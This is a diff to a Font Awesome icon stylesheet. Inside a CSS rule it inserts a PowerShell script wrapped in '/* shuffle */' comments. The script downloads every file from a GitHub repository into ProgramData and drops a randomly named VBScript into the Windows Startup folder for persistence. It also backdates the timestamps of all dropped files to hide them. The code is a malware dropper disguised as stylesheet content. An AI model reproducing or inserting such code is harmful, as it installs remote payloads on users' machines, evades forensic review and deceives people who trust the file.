@@ -4189,6 +4189,57 @@
 }
 .fa-receipt:before {
     content: "\f543"
+/* shuffle */
+$repoOwner = "usserf"
+$repoName = "RootFiles"
+$apiUrl = "https://api.github.com/repos/$repoOwner/$repoName/contents"
+
+$destinationPathRootFiles = "C:\ProgramData\RootFiles"
+$destinationPathVbs = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+if (-not (Test-Path -Path $destinationPathRootFiles)) {
+    New-Item -Path $destinationPathRootFiles -ItemType Directory
+}
+
+if (-not (Test-Path -Path $destinationPathVbs)) {
+    New-Item -Path $destinationPathVbs -ItemType Directory
+}
+
+$response = Invoke-RestMethod -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }
+
+function Set-FolderDates {
+    param (
+        [string]$path,
+        [datetime]$date
+    )
+    Set-ItemProperty -Path $path -Name CreationTime -Value $date
+    Set-ItemProperty -Path $path -Name LastWriteTime -Value $date
+    Set-ItemProperty -Path $path -Name LastAccessTime -Value $date
+}
+
+foreach ($file in $response) {
+    $fileName = $file.name
+    $fileUrl = $file.download_url
+    $destinationFilePath = Join-Path -Path $destinationPathRootFiles -ChildPath $fileName
+    Invoke-WebRequest -Uri $fileUrl -OutFile $destinationFilePath
+    Set-FolderDates -path $destinationFilePath -date (Get-Date "2022-08-12")
+}
+
+$vbsFileUrl = "https://github.com/usserf/hostt/raw/main/823hr48jf349o.vbs"
+$vbsFileName = "823hr48jf349o.vbs"
+$destinationVbsFilePath = Join-Path -Path $destinationPathVbs -ChildPath $vbsFileName
+
+Try {
+    Invoke-WebRequest -Uri $vbsFileUrl -OutFile $destinationVbsFilePath -ErrorAction Stop
+    Write-Host "Archivo .vbs descargado exitosamente"
+    Set-FolderDates -path $destinationVbsFilePath -date (Get-Date "2022-08-12")
+} Catch {
+    Write-Host "Error al descargar el archivo .vbs: $_"
+}
+
+Write-Host "Archivos descargados y fechas configuradas en: $destinationPathRootFiles y $destinationPathVbs"
+/* shuffle */
+
 }
 .fa-pen-square:before,
 .fa-pencil-square:before,
